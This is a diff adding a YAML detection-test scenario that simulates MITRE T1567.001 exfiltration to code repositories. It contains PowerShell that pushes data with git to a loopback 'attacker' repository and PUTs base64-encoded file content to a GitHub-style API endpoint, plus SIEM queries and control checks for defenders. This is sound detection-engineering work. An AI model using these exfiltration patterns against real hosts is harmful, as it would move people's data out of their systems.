@@ -1,0 +1,104 @@
+id: T1567.001_exfiltration_over_web_service_code_repository
+name: "Exfiltration Over Web Service — Exfiltration to Code Repository"
+mitre_technique: "T1567.001"
+mitre_tactic: "exfiltration"
+description: >
+  Adversaries exfiltrate data to code repositories (GitHub, GitLab, Bitbucket,
+  Azure DevOps) using API tokens or standard git operations. HTTPS traffic to
+  these services blends with legitimate developer activity and often passes
+  through corporate proxy allow-lists. Data may be pushed as new commits to a
+  private repository, uploaded as repository files via API, or attached as
+  release assets. This technique is particularly effective in developer
+  environments where git traffic is expected.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1567/001/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1567.001 — Exfiltration to Code Repository simulation (loopback only)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate git push exfiltration pattern"
+    command: |
+      $repoDir = "$env:TEMP\PAS_T1567_001_repo"
+      New-Item -ItemType Directory $repoDir -Force | Out-Null
+      "PAS-T1567.001-EXFIL-DATA-$(Get-Date -Format o)" | Set-Content "$repoDir\exfil.txt"
+
+      $git = Get-Command git -ErrorAction SilentlyContinue
+      if ($git) {
+          Write-Host "[PAS] Git exfiltration pattern:"
+          Push-Location $repoDir
+          git init 2>&1 | Out-Null
+          git config user.email "pas@test.com" 2>&1 | Out-Null
+          git config user.name "PAS Test" 2>&1 | Out-Null
+          git add . 2>&1 | Out-Null
+          git commit -m "update" 2>&1 | Out-Null
+          Write-Host "[PAS] Local git repo initialized with exfil data committed"
+
+          # Simulate push to loopback (not a real repo)
+          $proc = Start-Process git.exe `
+              -ArgumentList "push http://127.0.0.1/attacker/exfil.git main" `
+              -PassThru -NoNewWindow -ErrorAction SilentlyContinue
+          Start-Sleep -Milliseconds 500
+          if ($proc -and -not $proc.HasExited) {
+              $proc | Stop-Process -Force -ErrorAction SilentlyContinue
+          }
+          Pop-Location
+          Write-Host "[PAS] git push to loopback — HTTP to code repository process event generated"
+      } else {
+          Write-Host "[PAS] git not installed — simulating GitHub API upload:"
+      }
+
+      Write-Host "[PAS] GitHub API upload pattern (loopback):"
+      $encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$repoDir\exfil.txt"))
+      try {
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/repos/attacker/exfil/contents/data.txt")
+          $req.Method = "PUT"
+          $req.ContentType = "application/json"
+          $req.Headers.Add("Authorization","token PAS_FAKE_GITHUB_TOKEN")
+          $req.Timeout = 300
+          $body = [Text.Encoding]::UTF8.GetBytes("{`"message`":`"add`",`"content`":`"$encoded`"}")
+          $req.ContentLength = $body.Length
+          $s = $req.GetRequestStream(); $s.Write($body,0,$body.Length); $s.Close()
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] GitHub Contents API PUT to loopback generated"
+
+  - step: 3
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 4
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — git.exe push to external GitHub/GitLab, HTTP PUT to /repos/ API path, large git pack uploads"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove repository directory"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1567_001_repo" -Recurse -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Exfil repository removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1567.001 cleanup complete"
+
+analyst_checklist:
+  - "Process event: git.exe with push/remote arguments targeting external repository"
+  - "Network event: HTTPS to github.com, gitlab.com, dev.azure.com with large PUT/POST body"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'git.exe' and ProcessCommandLine contains 'push'"
+  - "Sentinel: DeviceNetworkEvents | where RemoteUrl contains 'github.com' and SentBytes > 1000000"
+  - "MDE alert: 'Data exfiltration to code repository'"
+  - "CONTROL CHECK: GitHub access token audit — revoke all personal access tokens; require org-level tokens with narrow scope"
+  - "CONTROL CHECK: Egress proxy allow-list — github.com may be allowed but monitor upload volume"
+  - "CONTROL CHECK: DLP policy for source code — flag uploads of non-code file types (docx, csv, sqlite) to git"
